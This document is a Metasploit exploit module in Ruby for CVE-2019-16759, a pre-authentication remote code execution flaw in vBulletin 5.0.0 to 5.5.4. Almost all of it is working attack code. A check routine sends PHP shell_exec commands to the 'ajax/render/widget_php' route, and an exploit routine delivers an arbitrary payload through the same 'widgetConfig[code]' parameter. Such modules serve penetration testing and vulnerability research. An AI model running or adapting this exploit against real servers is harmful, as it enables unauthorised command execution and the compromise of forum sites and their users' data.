##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
 super(update_info(info,
                   'Name'           => 'vBulletin 5.x 0day pre-quth RCE exploit',
      'Description'    => %q{
        vBulletin 5.x 0day pre-auth RCE exploit.
        This should work on all versions from 5.0.0 till 5.5.4
      },
      'Platform'       => 'php',
      'License'        => MSF_LICENSE,
      'Author'         => [
          'Reported by: anonymous',  # reported by
          'Original exploit by: anonymous',  # original exploit
          'Metasploit mod by: r00tpgp',  # metasploit module
      ],
      'Payload'        =>
        {
          'BadChars'    => "\x22",
        },
      'References'     =>
        [
          ['CVE', 'CVE-2019-16759'],
          ['EDB', 'NA'],
          ['URL', 'https://seclists.org/fulldisclosure/2019/Sep/31'],
          ['URL', 'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16759']
        ],
      'Arch'           => ARCH_PHP,
      'Targets'        => [
          [ 'Automatic Targeting', { 'auto' => true }  ],
      #    ['vBulletin 5.0.X', {'chain' => 'vB_Database'}],
      #    ['vBulletin 5.1.X', {'chain' => 'vB_Database_MySQLi'}],
      ],
      'DisclosureDate' => 'Sep 23 2019',
      'DefaultTarget'  => 0))

      register_options(
        [
          OptString.new('TARGETURI', [ true, "The base path to the web application", "/"])
        ])

  end

    def check
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path,'/index.php?routestring=ajax/render/widget_php'),
      'encode_params' => false,
      'vars_post'     => 
      {
        'widgetConfig[code]'  => "echo shell_exec(\'echo h4x0000r4l1f4 > /tmp/msf.check.out; cat /tmp/msf.check.out\');exit;",
      }
     })

     if res && res.body && res.body.include?('h4x0000r4l1f4')
       return Exploit::CheckCode::Vulnerable
     end

     Exploit::CheckCode::Safe
  end

    def exploit
      print_status("Sending payload.....")
      resp = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path,'/index.php?routestring=ajax/render/widget_php'),
      'encode_params' => false,
      'vars_post'     =>
      {
        #'widgetConfig[code]'  => "echo " + payload.encoded + "exit;",
	 'widgetConfig[code]'  => payload.encoded,
      }
     })
      #unless resp and resp.code == 200
      # fail_with(Failure::Unknown, "Exploit failed.")
      #end

      #print_good("Success!")
      #print_line(resp.body)

   end
end